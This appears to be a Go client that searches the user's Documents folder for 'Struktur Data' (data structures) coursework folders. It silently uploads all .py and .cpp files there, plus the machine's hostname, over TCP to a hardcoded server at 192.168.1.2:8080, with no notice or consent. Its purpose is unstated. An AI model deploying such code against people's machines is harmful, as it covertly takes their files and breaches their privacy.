package main

import (
    "fmt"
    "io"
    "log"
    "net"
    "os"
    "path/filepath"
    "strings"
)

const (
    serverIP   = "192.168.1.2"
    serverPort = "8080"
    bufferSize = 1024
)

type FileInfo struct {
    Path string
    Name string
    Size int64
}

func findRelevantFolders() ([]string, error) {
    // Get user's Documents folder
    userHome, err := os.UserHomeDir()
    if (err != nil) {
        return nil, fmt.Errorf("error getting user home directory: %v", err)
    }
    documentsPath := filepath.Join(userHome, "Documents")

    var folders []string
    err = filepath.Walk(documentsPath, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return err
        }
        if info.IsDir() && strings.Contains(info.Name(), "Struktur Data") {
            folders = append(folders, path)
        }
        return nil
    })
    return folders, err
}

func sendFile(conn net.Conn, filePath string) error {
    file, err := os.Open(filePath)
    if err != nil {
        return fmt.Errorf("error opening file: %v", err)
    }
    defer file.Close()

    fileInfo, err := file.Stat()
    if err != nil {
        return fmt.Errorf("error getting file info: %v", err)
    }

    // Send file metadata
    fileData := FileInfo{
        Path: filePath,
        Name: fileInfo.Name(),
        Size: fileInfo.Size(),
    }
    fmt.Fprintf(conn, "%s\n%d\n", fileData.Name, fileData.Size)

    // Send file content
    buffer := make([]byte, bufferSize)
    for {
        n, err := file.Read(buffer)
        if err == io.EOF {
            break
        }
        if err != nil {
            return fmt.Errorf("error reading file: %v", err)
        }
        _, err = conn.Write(buffer[:n])
        if err != nil {
            return fmt.Errorf("error sending file: %v", err)
        }
    }
    return nil
}

func processFolder(conn net.Conn, folderPath string) error {
    return filepath.Walk(folderPath, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return err
        }
        if !info.IsDir() {
            ext := strings.ToLower(filepath.Ext(path))
            if ext == ".py" || ext == ".cpp" {
                if err := sendFile(conn, path); err != nil {
                    log.Printf("Error sending file %s: %v", path, err)
                }
            }
        }
        return nil
    })
}

func main() {
    // Set up logging
    log.SetFlags(log.LstdFlags | log.Lshortfile)

    // Find relevant folders
    folders, err := findRelevantFolders()
    if err != nil {
        log.Fatalf("Error finding folders: %v", err)
    }

    // Get hostname for client identification
    hostname, err := os.Hostname()
    if err != nil {
        log.Fatalf("Error getting hostname: %v", err)
    }

    // Connect to server
    serverAddr := fmt.Sprintf("%s:%s", serverIP, serverPort)
    conn, err := net.Dial("tcp", serverAddr)
    if err != nil {
        log.Fatalf("Error connecting to server: %v", err)
    }
    defer conn.Close()

    // Send hostname
    fmt.Fprintf(conn, "%s\n", hostname)

    // Process each folder
    for _, folder := range folders {
        if err := processFolder(conn, folder); err != nil {
            log.Printf("Error processing folder %s: %v", folder, err)
        }
    }

    log.Println("File transfer completed successfully")
}